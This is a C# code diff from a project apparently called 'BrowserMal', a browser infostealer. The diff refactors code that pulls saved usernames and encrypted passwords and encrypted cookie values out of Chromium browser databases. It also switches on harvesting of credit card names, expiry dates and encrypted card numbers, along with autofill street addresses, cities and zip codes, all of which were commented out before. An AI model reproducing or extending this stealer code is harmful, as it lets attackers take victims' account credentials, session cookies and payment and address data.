@@ -20,9 +20,7 @@ namespace BrowserMal
                 new ColumnModel("username_value", isEncrypted: false, needsFormatting: false, isImportant: false),
                 new ColumnModel("password_value", isEncrypted: true, needsFormatting: false, isImportant: true)
             };
-
-            GenericManager<CredentialModel> generic = new GenericManager<CredentialModel>("logins", new SqliteTableModel(credsColumns));
-            generic.Init(ref browsers, Browser.Util.LOGIN_DATA);
+            new GenericManager<CredentialModel>("logins", new SqliteTableModel(credsColumns)).Init(ref browsers, Browser.Util.LOGIN_DATA);
 
             List<ColumnModel> cookiesColumns = new List<ColumnModel>
             {
@@ -32,28 +30,25 @@ namespace BrowserMal
                 new ColumnModel("expires_utc", isEncrypted: false, needsFormatting: true, isImportant: false, Browser.Util.ChromiumToUnixTimestamp),
                 new ColumnModel("encrypted_value", isEncrypted: true, needsFormatting: false, isImportant: true)
             };
+            new GenericManager<CookieModel>("cookies", new SqliteTableModel(cookiesColumns)).Init(ref browsers, Browser.Util.COOKIES);
 
-            GenericManager<CookieModel> cookiesManager = new GenericManager<CookieModel>("cookies", new SqliteTableModel(cookiesColumns));
-            cookiesManager.Init(ref browsers, Browser.Util.COOKIES);
-
-            /*
-            GenericManager<CreditCardModel> creditManager = new GenericManager<CreditCardModel>("credit_cards", new string[] 
-            { 
-                "name_on_card", 
-                "expiration_month", 
-                "expiration_year", 
-                "nickname", 
-                "card_number_encrypted" 
-            }, true);
-            creditManager.Init(ref browsers, Browser.Util.WEB_DATA);
-
-            GenericManager<AddressesModel> addressesManager = new GenericManager<AddressesModel>("autofill_profiles", new string[]
+            List<ColumnModel> creditCardsColumns = new List<ColumnModel>()
             {
-                "street_address",
-                "city",
-                "zipcode"
-            }, false);
-            addressesManager.Init(ref browsers, Browser.Util.WEB_DATA);*/
+                new ColumnModel("name_on_card", isEncrypted: false, needsFormatting: false, isImportant: false),
+                new ColumnModel("expiration_month", isEncrypted: false, needsFormatting: false, isImportant: false),
+                new ColumnModel("expiration_year", isEncrypted: false, needsFormatting: false, isImportant: false),
+                new ColumnModel("nickname", isEncrypted: false, needsFormatting: false, isImportant: false),
+                new ColumnModel("card_number_encrypted", isEncrypted: true, needsFormatting: false, isImportant: false)
+            };
+            new GenericManager<CreditCardModel>("credit_cards", new SqliteTableModel(creditCardsColumns)).Init(ref browsers, Browser.Util.WEB_DATA);
+
+            List<ColumnModel> addressesColumns = new List<ColumnModel>()
+            {
+                new ColumnModel("street_address", isEncrypted: false, needsFormatting: false, isImportant: false),
+                new ColumnModel("city", isEncrypted: false, needsFormatting: false, isImportant: false),
+                new ColumnModel("zipcode", isEncrypted: false, needsFormatting: false, isImportant: false)
+            };
+            new GenericManager<AddressesModel>("autofill_profiles", new SqliteTableModel(addressesColumns)).Init(ref browsers, Browser.Util.WEB_DATA);
         }
     }
 }
